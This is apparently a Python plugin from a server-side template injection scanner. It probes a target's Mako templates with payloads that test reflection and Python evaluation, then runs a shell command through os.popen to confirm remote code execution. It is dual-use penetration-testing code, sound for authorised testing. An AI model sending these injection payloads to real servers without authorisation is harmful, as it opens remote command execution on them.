from plugins.generic.check import Check
from utils.loggers import log
import random
import string

class Mako(Check):
    
    def init(self):
        
        self._check_reflection()
        
        if not self.state.get('reflection'):
            return
            
        log.warn('Reflection detected')
        
        self._check_python()
            
        if not self.state.get('language') or  not self.state.get('engine'):
            return
            
        log.warn('Python injection detected')   
        
        self._check_os()
        
        if not self.state.get('exec'):
            return
            
        log.warn(
            'Shell command execution detected on \'%s\' operating system' % (
                self.state.get('os', 'undetected')
            )
        )

    def _check_python(self):
        
        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
        
        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)
        
        if expected == self.req(payload):
            self.state['language'] = 'python'
            self.state['engine'] = 'mako'
    
    def _check_reflection(self):
        
        randA = random.randint(10, 100)
        randB = random.randint(10, 100)

        payload = '${%i*%i}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.state['reflection'] = True
        
    def _check_os(self):
        
        expected_rand = str(random.randint(999, 10000))
        payload = """<%%
        import os
        x=os.popen('echo %s').read()
        %%>${x}""" % expected_rand
                
        if expected_rand == self.req(payload):
            self.state['exec'] = True      

        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
                
        self.state['os'] = self.req(payload) 